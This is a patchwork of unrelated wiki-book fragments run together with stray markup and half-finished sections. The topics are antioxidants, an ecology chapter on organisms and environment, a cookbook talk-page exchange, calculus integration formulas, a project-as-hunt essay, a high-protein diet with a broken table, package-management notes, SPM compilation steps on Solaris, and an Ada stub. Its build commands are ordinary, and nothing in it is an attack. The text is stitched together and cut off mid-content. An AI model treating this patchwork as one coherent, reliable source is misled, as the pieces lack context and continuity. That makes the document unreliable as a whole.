Oxidation that occurs in the human body can lead to improper functioning of the body. Substances known as [[w:Radical_%28chemistry%29#Free_radicals_in_biology|free radicals]], which are highly reactive (have a strong tendency to take part in chemical reactions), undergo oxidation that can result in cell damage. This general process is thought to be a contributor of many undesirable conditions: cancer, aging symptoms, alcohol-induced liver damage, Parkinson's disease, senile and drug-induced deafness, schizophrenia, Alzheimer's and the iron-storage disease hemochromatosis.

While many studies have suggested benefits for antioxidant supplements in laboratory experiments, clinical trials on humans have failed to clearly demonstrate a benefit, while strong antioxidants, such as [[w:oxalic acid|oxalic acid]] and [[w:phytic acid|phytic acid]] can have anti-nutritional effects due to their binding to dietary minerals in the gastrointestinal tract and preventing absorption. While antioxidants supplementation is widely hypothesized to prevent the development of cancer, antioxidants may, paradoxically, interfere with cancer treatments.[http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=pubmed&amp;dopt=Abstract&amp;list_uids=16959608]

===Nutritional Sources of Antioxidants===

Some foods guard against the negative effects of free radicals in the body, and are commonly referred to as antioxidants. These foods include the following:

*'''Fruits'''. Cranberries, blueberries, plums, peaches, blackberries, raspberries, apples, strawberries, red currants, figs, cherries, gooseberries, pears, guava, peaches, oranges, apricots, mangoes, grapes, pomegranates plums, raisins and dates. Dried fruits are especially high in antioxidants (more so than fresh), because the concentration means more antioxidants per serving.
*'''Vegetables'''. Artichokes, cabbage, broccoli, asparagus, avocados, beetroot, radishes, kale, onion, romaine lettuce, parsley, and spinach.
*'''Spices'''. Cinnamon, turmeric, cumin, curry powder, mustard seed, ginger, pepper, chili powder, paprika, garlic, coriander, and cardamom.
*'''Herbs'''. Sage, thyme, marjoram, tarragon, peppermint, oregano, parsley, savory, basil, rosemary, dill weed.
*'''Cereals'''. Sorghum bran, crude rice bran, corn flakes, oats and granola.
*'''Nuts'''. Pecans, walnuts, hazelnuts, pistachios, almonds, cashews, macademia nuts and peanuts (though not technically a nut).
*'''Other'''. Red wine, [[Cookbook:Tea|tea]], [[Cookbook:Fungus|fungi]], essential oils and cocoa.

Vitamin C, vitamin E, and lycopene are noted antioxidants.

==In Foods==

In foods, oxidation generally contributes to spoilage, and therefore the canning process preserves food by reducing available oxygen (as well as by killing microorganisms that contribute to spoilage).

Some food preservatives are antioxidants, such as [[Cookbook:Sulfur Dioxide|sulfur dioxide]], which is often added to dried [[Cookbook:Apricot|apricots]], and [[w:BHT|BHT]] which is often added to breakfast cereal packaging.

The most basic interest of ecologists is how organisms interact with their environment. Inanimate objects do not normally &quot;interact&quot;&amp;mdash;they are simply acted upon by forces in the environment. Organisms, however, cannot be totally passive within a chain of events and still sustain life.  In a sense, life represents a reversal of the &quot;normal&quot; order of things in a universe where physical and chemical reactions proceed, on balance&amp;mdash;and usually rather directly&amp;mdash;towards lower energy states.

When a volcano erupts it lays down rocks on the surface of its slopes.  These rocks are elevated in energy state from their previous existence as physical material deep within the earth. But on balance, in order to erupt, that material was first heated until  fluid, and then tremendous amounts of energy expended (as pressure) to push the material (magma) up to spew as lava from the top of the mountain.  Only a small portion of that energy remains on the volcano in the form of potential energy of rocks perched on the surface. That potential energy will eventually be released after forces of erosion loosen the rocks and they roll downslope or are ground to silt and deposited in the ocean deep.

In essence, the physical environment (as distinct from the biological environment) is composed of various forms of matter and energy.  The physical environment is one of material acted upon by various forces (energy), resulting in a lower energy state of the material with a concomittant release or conversion of energy as (usually) heat or light.

Living systems&amp;mdash;organisms&amp;mdash;respond in various ways to contacts with the physical forces of an ever-changing environment and interrelationships with other living organisms. The hereditary potentialities of an organism determine what it ''can'' do, but the environment determines what it actually ''does'' and to what degree (Greulach &amp; Adams, 1962). This theme is important and you will see it repeated in the discussions that follow.
 
Organism responses can be described under four different categories:
* morphological,
* physiological,
* behavioural, and
* community relations.
Although these are more or less distinct categories and will be discussed in detail in this chapter, an organism's response to an environmental challenge seldom involves just one of these.  At the very least, the growth or development of a morphological feature involves internal physiological processes occurring between the genetic blue-print in the cells and some final expression of an anatomical trait. A protective morphological trait like horns on a bull come into play through behavioral actions. The horns are not a threat to a predator until wielded in an effective manner.

==  The Physical Environment  ==

Why are all species not evenly distributed over the earth?  A number of ''abiotic'' (non-living) factors shape the ecological patterns we observe over the face of the earth.  Those factors include: water, temperature, wind, salt concentration, pH and the fact that the world is round.  The fact that the earth is round has a substantial impact on the distribution of solar radiation, precipitation and wind across the Earth's surface.  It is also responsible for the major movements of oceans.  All of these abiotic factors naturally play an important role in the distribution and abundance of organisms across the globe.

Solar irradiation affects temperatures on Earth.  Most organisms are '''mesophiles''' that like temperatures between 20-40 degrees C, some organisms are '''sychrophiles''' that like temperatures below 20 degrees C (cold-living organisms), and some organisms are '''thermophiles''' that like temperatures above 40 degrees C (heat-living organisms).  Seasonality is somewhat associated with temperature.  Some of the effects of seasonality include- (1) hibernation due to temperature and scarce resources, (2) rainfall/precipitation that determines how well certain plants or trees grow, and (3) wind.  

Another aspect that is important to the diversity of animals' location is the amount of oxygen that is present in the particular area.  For example, some organisms are '''aerobes''' which need oxygen for survival, and some are '''anaerobes''' which require the absence of oxygen for survival .  However, not all organisms require the same amount of oxygen.  Some organisms are '''microaerophiles''' and require little oxygen in order to live, but those organisms still do require oxygen for survival although it may not be as much as other organisms. 

Dissolved oxygen plays a major role in supporting life in bodies of water. The greater the amount of oxygen in a body of water the more organisms the water can support. Algae release oxygen into the water which is later consumed by organisms during respiration. This process is efficient in the summer when the algae can consume adequate amount of sunlight. When lakes freeze over in the winter the snow covered ice blocks the sunlight from the algae. This causes a drop in oxygen production in the body of water since the organisms continue to respire. Low dissolved oxygen can cause a problem with predator/prey interactions within an ecosystem. Different organisms have different tolerance to low oxygen. If the predator can survive more efficiently than the prey, the amount of prey will rapidly decline. This can have a major effect on an entire food web. An experiment of this was conducted in the Chesapeake Bay. [[http://www.esajournals.org/perlserv/?SESSID=401bd1ae9299928591b2f764da2035c2&amp;request=get-abstract&amp;doi=10.1890%2F0012-9615%281997%29067%5B0489%3AVEOLDO%5D2.0.CO%3B2]]    

Water also plays a major role in the diversification of organisms throughout the world.  As previously mentioned, the amount of precipitation is vital for plants to grow, which can provide food (serve as a food source) to other organisms.  The salt concentration (salinity) is an important aspect to look at when dealing with water because some organisms are '''halophiles''' which are organisms that require salt in order to survive.  The currents of the water that makes up the oceans is also important.  The '''gyres''' are the surface currents in the oceans.  The gyres distribute heat from the equators towards the poles causing the polar waters to have less energy than the water at the equator.  The other type of current is the deep water current that sinks to the sea floor and flows towards the equator causing the polar waters to have a higher salinity and a higher density.  

Meteorology plays an important aspect to life on Earth as well.  The Earth is divided into three main parts- (1) Hadley Cell which is characterized as having Northeast trade winds and is mostly desert landscaping because of the cool, dry air, (2) Ferrell Cell which is characterized as having Westerlie winds, and (3) Polar Cell which is at the North and South poles of the Earth.  The weather and wind effects plant dispersal (pollen and seeds getting blown) and the weather and the wind also effect the habitat range from which organisms can live in.  

The pH is also a factor that contributes to life.  The pH of the '''ocean''' is approximately 8.2.  A deviation from this pH is slowly occurring, known as '''ocean acidification'''.  Over a period of 243 years the pH of the ocean has dropped 0.075 in its pH. This slow acidification is a primary concern for calcium carbonate organisms.  Structures made of calcium, including skeletons, are vulnerable to dissolution at lower pHs.  
'''Soil''' pH can range from 4.5 to 8.0, depending on area and vegetation growth.  The main macronutrients in soil for vegetation are calcium, phosphorus, nitrogen, potassium, magnesium,and sulfur.  Most vegetation prefers neutral to slightly basic or alkaline pH level, because at this level the macronutrients are readily picked up.
'''Rain water''' is slightly acidic, depending on the amount of carbonic acid present.  The average pH for rain water is 5.7.  '''Natural freshwaters''', such as lakes and streams, are also slightly acidic with a pH from 5.5 to 7.7.  Drastic alteration in pH levels can have devastating effects. One example is '''acid rain'''.  Acid rain has been known to destroy everything it touches, from minerals, to plant life, to animal and human life.

The effect of wind on biodiversity varies greatly from one region to the next. For example, in southeast Alaskan rainforests, wind shapes the forests and the extent at which forests are composed. [[http://www.fs.fed.us-pnw-pubs-gtr_421.pdf]] While in other parts of the world wind driven damage from hurricanes and tornadoes affect the biodiversity by destroying trees and plants used for food and shelter. Storms are partially driven by wind currents, which in turn bring more moisture to certain areas of the planet. Wind also has a major effect on the amount of time it takes water to evaporate back into the atmosphere.  A pond will hold water longer when no wind is present to intensify the drying effect.  Wildfires that destroy habitat for plants and animals can be greatly manipulated by winds.  Winds can spread fires quickly and over great distances to further disrupt biodiversity.

Another major effect of wind is erosion.  Deserts are continuously being moved and reshaped by erosion and sandstorms caused by wind displacing sand from one terrirory to another.  Wind erosion also displaces soil for plant growth by removing the most fertile top layer of soil from the earth.  Soil erosion limits the growth of plants and the diversity of animals and insects that feed on these plants.  [[image:Dust-storm-Texas-1935.png|thumb|350px|right|]]The Dust Bowl in the 1930s is an excellent example of wind destruction across the plains of North America.

The dispersal of plants is greatly effected by wind driven pollen and seed distribution.  Birds that feed on small wind driven seeds from one area will excrete the seeds in another area and in turn the seed can end up in numerous areas after being blown to one or two areas.  The distribution of pollen and the cross pollination on plants brings more opportunities for animals to feed and have shelter, increasing the chance for reproduction and biodiversity.  With deforestation diversity is greatly reduced, but winds without the obstruction of trees allow seeds and spores to be spread over a greater distance.  This will help regenerate lost habitat and increase biodiversity. [[http://www.esajournals.org/perlserv/?request=get-abstract&amp;issn=0012-9658&amp;volume=085&amp;issue=11&amp;page=3069&amp;ct=1]]

The fact that the Earth is round leads to several of the aspects that have been previously mentioned in the above paragraphs.  Since the Earth is round, solar irradiation is distributed unevenly across the Earth's surface, which simply means that more solar radiation hits at the equator than at the poles.  The less solar irradiation you have, the less energy there is, causing less biomass (living organisms and less diversity).  All forms of life require some quantity of solar radiation in order to survive, but the amount varies from organism to organism.

Why does the temperature vary so greatly from the tropics to the poles? It is not simply a matter of more incident irradiation hitting the equator.  Rather more irradiation impinges on a smaller area near the equator when compared to the poles.  Furthermore, because sunlight strikes the poles at an angle it must traverse more of the atmosphere before being absorbed by the earth. As a result of having to travel through more of the atmosphere more of the solar energy is deflected or reradiated back into space.  How does this impact life on earth? Less solar irradiation per unit area  means that temperatures are generally cooler towards the poles which limits the kinds of organisms that may inhabit these environments.  More irradiation near the equator means more energy is added to the ecosystem which translates in more ''biomass''.

New problems in global ecology include rising levels of atmospheric CO&lt;sub&gt;2&lt;/sub&gt;  concentrations and other greenhouse gases, and the resultant potential changes in global climate patterns. General Circulation Models (GCMs) (see [[Wikipedia:en:Global Climate Model|Global Climate Model]]) are complex computer models developed by atmospheric scientists to help predict how increasing greenhouse gas concentrations might influence global climate patterns on a large scale.

For example, elevated temperatures, which are in part due to raised concentrations of carbon dioxide, affect turtle hatchlings. The map turtle and red-eared slider turtle both have temperature-dependent sex determination. A higher temperature results in a female hatchling, whereas a lower temperature results in a male. Thus, raised temperature result in fewer male turtles.

Global warming has a great impact on biodiversity distribution and abundance. Processes and patterns of the climate influence behavioral and physiological response of organisms, their productivity, relative competitive abilities of species, birth, growth, and death rates, nutrient cycling, decomposition, net primary production, and community structure of populations.

==  Organism Morphology ==
[[File:Lightmatter hornbill.jpg|thumb|350px|right|The beak or bill of an immature male Wrinkled Hornbill (''Aceros corrugatus'') is a morphological adaptation that is both distinct from the beaks of most other species of birds and will change structurally as the individual ages and matures]]
The form that an organism takes&amp;mdash;termed its '''life-form'''&amp;mdash;encompasses all of the structural aspects that make that species describable and unique.  By '''morphological adaptations''' is meant the structural feature or features (called traits) that allow an organism to live successfully in its habitat; traits that have evolved over a (usually long) period of time as a consequence of the process of '''natural selection'''.

'''Natural Selection''' is a process that occurs over several generations. It allows select organisms to adapt to their environment over time. Natural selection often results in a species being able to survive in areas with environmental restrictions. For example, a plant that can grow taller than the others around it can get more sun light then the other plants around it and will increase its chance of survival and its overall '''fitness.''' For Natural Selection to occur, two requirements must be met. First there must be variation in some trait and second the trait must affect either survival or reproduction or both. Natural selection can result in '''Directional Selection''' or '''Disruptive selection'''.  Directional Selection is when individuals at one end of the distribution do well and the other doesn’t. Disruptive selection is when there is an intermediate that does not do as well as the individuals on the other sides of the distribution. 

* Read [[Wikipedia:en:Directional selection]] (for further information)
* Read [[Wikipedia:en:Disruptive selection]]
* Read [[Wikipedia:en:Natural selection|natural selection]] (&lt;small&gt;Links need not be pursued at this time&lt;/small&gt;)

Although we might conclude that adaptive morphological traits are acquired by a species slowly through the evolutionary process and therefore not subject to change within the lifespan of an individual, in fact many morphological traits are expressed or modified in response to  environmental conditions. The individual organism inherits morphological variation within a range, and the expression of the trait represents a response to specifics of that individual's environment.  The considerable similarity of all individuals of a species attests to the genetic basis of morphological traits, yet a degree of plasticity is usually present to be influenced by environmental factors.  Individuals inherit this plasticity and not the '''growth-form''' of the parents. Thus ''growth-form'' represents the outcome of both &quot;nature&quot; (genetic or inherited traits) and &quot;nurture&quot; (influences of environment on the growth process).  

A growth-form that persists through many generations because of environmental constancy (but is not an inherited trait) is termed an '''ecad'''.  However, any such trait is subject to natural selection and may, over time, become fixed in a population as an inherited '''eco-type'''. That is, if the trait is highly adaptive within the habitat of the population, and the plasticity of expression is under-utilized becoming a genetic burden, that plasticity may be lost or restricted. Eco-types are genetically based differences between individuals of the same species that come from different populations.

== Organism Physiology ==

Physiology is the study of biochemical functions of living organisms.  Whereas morphology (discussed above) is essentially about anatomy and structure, physiology is largely about processes. However, the two are so interlinked in any organism that one cannot really be discussed without consideration of the other.  As already noted, physiological processes must proceed the growth of morphological traits. And a physiological response, such as an increase in blood pressure, results from short-term mechanical changes in the anatomy of the heart and arteries. Put another way, the shape and structure of a heart is a morphological trait; the pumping of blood&amp;mdash;the function of the heart organ&amp;mdash;is a physiological activity. Muscle contractions are mechanical actions resulting from biochemical signals and changes. One cannot occur without the other.

Biologists refer to '''physiological adjustment''' as a response to environmental change. By &quot;adjustment&quot; is meant a change in physiology or internal function that allows the organism to maintain life. An adjustment is limited by the physiological and morphological adaptations inherited by the organism.  Just as we previously described &quot;morphological variation&quot; as essentially an adjustment to environment based upon inheritance of a range of possibility, so too is physiology controlled by both inherited (genetic) and environmental (external) factors. The important distinction here is between the terms &quot;adjustment&quot; and &quot;adaptation&quot;, a distinction that can apply to both morphology and physiology.
* '''Adaptations''' are physiological processes or morphological traits inherited through genetics and subject to natural selection at the population level;  
* '''Adjustments''' are activities and traits expressed within an inherited range and subject to individual modification within the life-span of the individual or even much shorter periods of time. The proper term here is '''acclimatization'''.

If I work out and buff my body to rival that of the current Governor of California, I am not adapting but adjusting or acclimatizing myself (considerably, comparing our growth-forms!). On the other hand, when a caterpillar changes into a pupa and then transforms itself into a butterfly, that is clearly an adaptation. The process (called metamorphosis) is an inherited one, and irreversible. Aging is a process that would appear to be largely irreversible (certainly death is), and  apparently is an adaptation. Once reproductive success peaks and starts to decline, advantage for the species population goes towards eliminating older individuals (fortunately, some exceptions exist).

== Organism Behavior ==

Behavioral responses to environmental factors can be observed as movements of one sort or another.  We say that &quot;behavior&quot; is the way an organism &quot;acts&quot;&amp;mdash;what activities it &quot;does&quot;. Complex behaviors controlled by cognitive processes evolved from simple response behaviors, the understanding of which provides a basis for understanding how behavior confers survivability on an organism. Note that such responses are generally rapid (and mediated through nerves in higher animals) in organisms capable of locomotor activity, and generally much slower in organisms lacking means of motility.  Thus, plants, although devoid of musculature, nonetheless respond to '''stimuli''' of various sorts&amp;mdash;growing or turning towards a light, for example.  Simple turning responses, either towards or away from a specific stimulus, are termed '''tropisms'''. Actual physical movement towards or away from a stimulus are called '''taxes'''.  Similar behaviours called '''kineses''' involve physical movements that appear random in orientation or direction, but the intensity of activity is determined by the intensity of the stimulus.

* Read [[Wikipedia:en:Taxis|Taxes]] (&lt;small&gt;Follow links as necessary to understand concepts; Kineses included here as well&lt;/small&gt;)
     
== Community Relations ==

== Summarization ==
The &quot;home&quot; of the biosphere is the planet earth, an accretion body orbiting a star.  The physical realities of the planet, resulting from its size and location relative to that star called the &quot;sun&quot;, determine the basic physical properties within which life developed and presently exists.     

Organisms respond to changes and vagaries in the environment. Organisms, unlike non-living objects, survive because of the ability to respond. Responses take many forms, which we can categorize as morphological, physiological, or behavioral.  However, most responses involve a combination of these types, and sorting of responses into specific types typically just means that one is the more obvious aspect of the response observed.

I know see what you were doing by adding links to things like eggs etc.  Can I assume you enter them and if they are not already in Cookbook then they will come up red.  Or should you do a search on  each word the see if it is in the Book &quot;Cookbook&quot; [[User:Tviren]]

== Size of ingredients? ==

G'day.  I'm trying to work out the nutritional info and the recipe doesn't specify what size eggs, bacon etc. to use.  I'm going to guess and modify the recipe accordingly.  Please correct if wrong. [[User:Irrevenant|Irrevenant]] 05:01, 6 November 2005 (UTC)

:'''No!''' The standard egg size in the USA is &quot;Large&quot;, while the standard egg size in the EU is &quot;M&quot; (medium I guess). They are about the same though, since the chickens aren't any different. It is thus best to avoid specifying the size. People will use their normal eggs, which works out to be the same thing all over the world. [[User:AlbertCahalan|AlbertCahalan]] 09:00, 6 November 2005 (UTC)
:: So you can specify eggs by mass (like I did).  People always have the freedom to modify a recipe, but there still has to be a default recipe.  And, since nutritional information is a standard feature of recipes, that default has to be specific enough to calculate the nutritional info.  If you're unhappy with the sizes that I guessed, that's fine - I'm happy to recalculate the nutritional info based on any size you choose. [[User:Irrevenant|Irrevenant]] 08:47, 9 November 2005 (UTC)

10 oz bacon - over 1/2 pound, and 2 12 oz slices of cheese - that's over a pound and a half.  A lot of food and calories for one person!!!  Leave out the oz. measurements and the rest is fine.</text>

:''See [[Calculus/Integration techniques/Integration by Parts]]''.

For two functions ''u'' and ''dv'' of a variable ''x'',

&lt;math&gt;\int u dv = u v - \int v du&lt;/math&gt;

where ''u'' is chosen by precedence according to '''LIPET''':

* '''L'''ogarithmic
* '''I'''nverse Trigonometric
* '''P'''olynomial
* '''E'''xponential
* '''T'''rigonometric

=== Improper Integrals ===
:''See [[Calculus/Improper Integrals]]''.

For any function ''f'' of variable ''x'', continuous on the given infinite domain:

&lt;math&gt;\int_{a}^{\infin} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{b \to \infin}\int_{a}^{b} f(x)\, dx&lt;/math&gt;

&lt;math&gt;\int_{-\infin}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{a \to -\infin}\int_{a}^{b} f(x)\, dx&lt;/math&gt;

&lt;math&gt;\int_{-\infin}^{\infin} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\int_{-\infin}^{c} f(x)\, dx + \int_{c}^{\infin} f(x)\, dx&lt;/math&gt;

For any function ''f'' of variable ''x'' continuous on the given interval, but with an infinite discontinuity at (1) ''a'', (2) ''b'', or some (3) ''c'' in [''a'',''b'']:

&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{c \to b^-}\int_{a}^{c} f(x)\, dx&lt;/math&gt; (1)

&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\lim_{c \to a^+}\int_{c}^{b} f(x)\, dx&lt;/math&gt; (2)

&lt;math&gt;\int_{a}^{b} f(x)\, dx&lt;/math&gt;=&lt;math&gt;\int_{a}^{c} f(x)\, dx+\int_{c}^{b} f(x)\, dx&lt;/math&gt; (3)

      <text xml:space="preserve">	Planning is a big part of what thinking is for and project is just another name for prey, of course it is temporary endeavor, it is a hunt. Likewise it has a fixed start and end date because it has an objective persued by tiny finite beings, us. Again the fact that it is unique and no two projects are exactly the same, and it is not a routine operation all have to do with who we are - this is the plain of our existance.
	The team of people, temporary in nature, dispersed at the end of the project. Is again part of us, tomorrow we will organize another hunt. Our collective resources become our private resources which we will again collectivise. We have toned down the experience and made it into an abstract but we need to hunt big beasts with spears, it is human. Having bagged a few ROI's and even a few institutions and a couple of monuments for the ages I dream of bigger game: not only the planets and stars but cultural, social, and scientific conquests. We can do these things, not in the least because we can define them, and plan them. The trick, if it ever was a trick, is to percieve these things as resources, then we can organize the hunt.</text>

A '''High Protein Diet''' is often recommended by bodybuilders and nutritionists to help efforts to build muscle and lose fat. It should not be confused with low-carbohydrate diets such as the [[Cookbook:Atkins Diet Cooking|Atkins Diet]], which are not calorie-controlled and which often contain large amounts of fat.

High Protein diets typically obtain 30%&amp;ndash;60% of their [[Cookbook:calorie|calorie]]s from [[Cookbook:Protein|protein]], 15%&amp;ndash;30% from [[Cookbook:Fat|fat]] and the remainder from [[Cookbook:Carbohydrates|carbohydrates]]. They tend to rely heavily on seafood and lean meat, which makes them difficult or impossible for [[Cookbook:Vegetarian cuisine|vegetarian]]s.

==Benefits==

* Protein is essential for building muscle. 
* Unlike carbohydrates, protein provides long-lasting energy without an insulin surge (which promotes fat storage).
* Protein tends to suppress the appetite.
* Protein takes quite a bit of energy to digest, which boosts the body's metabolism.
* Lean protein-rich foods are much less calorie-dense than carbohydrate-rich foods. For example, the [[Cookbook:Ham|ham]] in a common [[Cookbook:Sandwiches|sandwich]] may have 343 kJ per 100g, whereas the [[Cookbook:Bread|bread]] has 1011 kJ per 100g. Like [[Cookbook:Vegetables|vegetables]], they help to bulk out a meal.

==Sample diet==
{| width=200px border=&quot;2&quot; cellpadding=&quot;4&quot; cellspacing=&quot;1&quot; align=&quot;right&quot; bgcolor=&quot;#f0f8ff&quot; style=&quot;margin-left:1em; margin-bottom:1em;&quot;

The daily food intake that is detailed below contains 1250 kCal in total, and would therefore be suitable for someone with 45 kg of lean bodyweight&amp;mdash;such as a 60 kg female with 25% bodyfat&amp;mdash;who wants to lose weight at a rate of &amp;frac14;&amp;ndash;&amp;frac12; kg a week (the maximum safe rate). Individuals with a greater lean bodyweight should increase their food intake proportionately, as should lean individuals who are attempting to gain weight. 50% of the calories come from protein, 25% from carbohydrates and 25% from fat.

Anyone attempting to reproduce this diet should try to find products that match the nutritional profiles shown below. The protein, carbohydrate and fat content is given as their percentage by weight, which is the same as grams per 100g (as marked on nutritional labels). This is ''not'' the same as the percentage of calories.

A multivitamin supplement should be taken to ensure that adequate levels of each essential vitamin and mineral are maintained.

Some of the milk can be put towards cups of coffee or tea throughout the day. If required, artificial [[Cookbook:Sweeteners|sweeteners]] should be used instead of sugar. Milk is important weapon against osteoporosis, not just because of its calcium content, but because it also contains enzymes that promote bone growth.

In order to achieve the recommended six meals a day, one sandwich should be eaten mid-morning, one at lunchtime and one mid-afternoon. Soya/linseed bread has very low Glycemic Index (36), which also helps to ensure a steady release of energy during the day. [[Cookbook:Lettuce|Lettuce]] or sliced [[Cookbook:Tomato|tomato]] may be added to make the sandwiches more interesting.

Red salmon is a very good source of Omega-3 essential fatty acids (2.7%). Other fish or seafood may be substituted if salmon is unavailable. The meal can be microwaved, or stir-fried without oil in a nonstick pan. &quot;Zero-calorie&quot; condiments such as herbs, spices and [[Cookbook:Soy Sauce|soy sauce]] may be added.

&lt;tr&gt;
&lt;td width=&quot;180px&quot;&gt;Protein Bar&lt;/td&gt;
&lt;td width=&quot;80px&quot; align=&quot;right&quot;&gt;&amp;frac12; large bar&lt;/td&gt;
&lt;td width=&quot;50px&quot; align=&quot;right&quot;&gt;45g&lt;/td&gt;
&lt;td width=&quot;50px&quot; align=&quot;right&quot;&gt;44.4%&lt;/td&gt;
&lt;td width=&quot;50px&quot; align=&quot;right&quot;&gt;21.0%&lt;/td&gt;
&lt;td width=&quot;50px&quot; align=&quot;right&quot;&gt;10.9%&lt;/td&gt;
&lt;td width=&quot;50px&quot; align=&quot;right&quot;&gt;1480&lt;/td&gt;
&lt;td width=&quot;80px&quot; align=&quot;right&quot;&gt;159 kCal&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

The protein bar may be more suitable as a pre-workout or post-workout meal, depending upon when the workout occurs. It can be useful pre-workout if the workout would otherwise occur more than two hours after the last meal. Alternatively, it can be consumed immediately following the workout, because both protein uptake and protein usage are increased at this time.

The protein shake should be taken shortly before going to bed to maintain protein availability during the night, when HGH (Human Growth Hormone) levels are at their peak. The milk-powder based diet shake adds slow-release casein to the mix of proteins, and offsets the sometimes poor taste of whey-based shakes. The added dietary fiber aids digestion.

==High Protein Recipes==

Most meat recipes are suitable for a High Protein diet, for example:

*[[Cookbook:Paprika Chicken|Paprika Chicken]]
*[[Cookbook:Coq au Vin|Coq au Vin]]
*[[Cookbook:Carpetbag Steak|Carpetbag Steak]]

Visible fat should be cut from the meat, and (in the case of poultry) the skin should be removed. Generally, lean meats such as beef or turkey are preferred to pork or duck.

Soya protein powder can be mixed with flour to increase the protein content of pancakes, muffins and other baked goods.

=== Challenge ===
In an IT organization which administrate all kind of computer systems, following abstracted diagram shows the systems are segregated into varied sub-systems islands by NIS name services. Each NIS islands has its own set of accounts, netgroups and varied same software.

[[Image:cpam-nis-islands.gif|frame | NIS islands in an IT within an organization.]]
Oftentimes we found ourselves got lock-in by a particular OS because of a few software applications run only on that OS. Adopting the CPAM (cross-platform application management) concept with the right implementation tools can prepare your application or IT information systems to be more portable. You don't have to stay with a particular OS if you don't want to. 

Also it is the software applications that run on computer that we need from computer.

The limited human computing resource is better to be spent on improving quality of software instead of on porting same software to all kind of different OS. 


This book explains the CPAM concept and a solution implemented by an OpenSource support company (TWW Inc.) This solution can be used to develop and manage OpenSource and commercial applications across operating systems in a consistent way.

One example of application that can be installed across OS platforms is Oracle database server. It provide customer an easy and consistent way to install Oracle server. No matter which supported OS you want to install Orcale server on, runInstaller is the universal command to install oracle server. But runInstall can only use to install Oracle application. What about other application that need to be installed across platforms ?  So we need a cross-platform package management system that can provide same command to manage all kinds of applications.

In this three subsets book, We introduce the CPAM concept and one of its best implementations. Then we introduce how to use applications that created by using TWW HPMS toolsets. Also we provide best practices for consumers to install and use CPAM applications. 

In developer's guide we focus on the TWW HPMS itself and provide guidance when you want to port the tool to an unsupported OS. We will analyze the TWW tool set and other similar tool sets.

In Reference Manual we provide a FAQ, HOWTO and a brief overview about all kinds of package management systems.

=== Solution ===
We hope your IT system will looks like following before you can really consolidate down to one or two OS.

== SPM8, SPM12 ==

There are no plans to provide SPM8 or SPM12 MEX files for Solaris SPARC (32 or 64 bit) as these platforms are not supported by MathWorks any more, see [http://www.mathworks.com/support/sysreq/roadmap.html MATLAB Roadmap].

== SPM5 ==

Precompiled MEX files for Solaris SPARC (*.mexsol and *.mexs64) are available in the latest update.

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm5.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login
unzip spm5.zip
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /home/login/spm5
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

In a Terminal, from the ''src'' folder of your SPM5 installation, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login/spm5/src
make distclean
make &amp;&amp; make install
&lt;/nowiki&gt;&lt;/pre&gt;

== SPM2 ==

The following is a description of how to compile SPM2 to run nicely with MATLAB 7 (service pack 1) on a SUN running Solaris 9 with the gcc compiler installed. The standard Makefile that came with SPM2 didn't quite work; partly because it was expecting you to use the cc compiler that comes with Solaris.

==== Setting up compiling for MATLAB7 ====

Copy the &quot;gccopts.sh&quot; file from $MATLAB_HOME_DIR/bin to the SPM2 directory and call it &quot;mexopts.sh&quot;.  This enables you to easily enter options for mex to use ONLY for compiling SPM2.  Lower down you make the changes to the Makefile to tell it to use this mexopts.sh file instead of the default.  Make sure this file sets variables like CC='gcc'.  You may also need to edit the line for MLIBS to:

  MLIBS=&quot;-L/opt/sfw/gcc-3/lib -L/opt/sfw/gcc-3/lib/gcc-lib -L$TMW_ROOT/bin/$Arch -lg2c -lmx -lmex -lmat -lm&quot;

(everything between the quotes should be on one line)
Note the extra directories to search for libraries and the &quot;-lg2c&quot; option are new.
To be on the safe side also try adding:

  EXTRA_LIBDIR=&quot;/opt/sfw/gcc-3/lib&quot;

Also changing the optimization flags may boost performance.  For an UltraSPARCIII cpu you could try the following:

  COPTIMFLAGS='-O3 -funroll-loops -mcpu=v9 -DNDEBUG -DBIGENDIAN'

Getting the linker set up properly needed some searching; try adding the following in the mexopts.sh file

  LDFLAGS=&quot;-shared -Wl,-M,$TMW_ROOT/extern/lib/$Arch/$MAPFILE,-R,$GCC_LIBDIR,-R,$EXTRA_LIBDIR&quot;

==== Editing the Makefile ====

Try changing the Makefile from:

 SunOS:
        make all SUF=mexsol  CC=&quot;cc -xO5&quot; MEX=&quot;mex COPTIMFLAGS=-xO5&quot;

to:

 SunOS:
        make all SUF=mexsol  CC=&quot;cc -xO5 -DBIGENDIAN&quot; MEX=&quot;mex COPTIMFLAGS=-xO5 -DBIGENDIAN&quot;
 SunOS.gcc:
 # Assumes that gccopts.sh has been copied to mexopts.sh in the current directory
        make all SUF=mexsol  CC=&quot;gcc -O3 -funroll-loops -DBIGENDIAN -fPIC&quot;\
                MEX=&quot;mex -f ./mexopts.sh&quot;

Again you could also try adding &quot;-mcpu=v9&quot; as an option in the CC variable for UltraSPARCIII cpu 
You may also need to edit the line

 all: verb.$(SUF) $(SPMMEX)

to:

 all: verb.$(SUF) archive $(SPMMEX)

As this recompiles the spm_vol_utils.a archive that may otherwise not be compatible with your newly compiled mexsol routines.

and then compiling using:
    make SunOS.gcc

You may have to do:
    make very_clean
first to get this to work.  Without doing this you may get a long list of errors when linking.

In order to find out where things might be going wrong you can edit the line above from:
 MEX=&quot;mex -f ./mexopts.sh&quot;
to:
 MEX=&quot;mex -n -f ./mexopts.sh&quot;
This will not compile the SPM routines but will tell you want commands mex was going to issue to gcc.

== Use clause ==

=== At library level ===

This use clause make the content of a [[Ada Programming/Packages|package]] immediately visible.

